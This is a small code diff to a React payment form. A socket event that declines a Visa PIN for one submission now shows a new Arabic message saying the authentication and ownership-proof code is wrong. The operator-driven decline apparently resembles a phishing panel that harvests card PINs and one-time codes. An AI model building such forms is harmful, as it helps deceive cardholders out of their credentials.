@@ -222,7 +222,9 @@ const PaymentForm = () => {
   socket.on("declineVisaPin", (id) => {
     if (id === JSON.parse(data)._id) {
       setLoading(false);
-      setError("تم رفض الرمز السري ");
+      setError(`حدث خطآ في رمز التوثيق 
+❌
+رمز اثبات الملكيه خاطئ`);
     }
   });
 
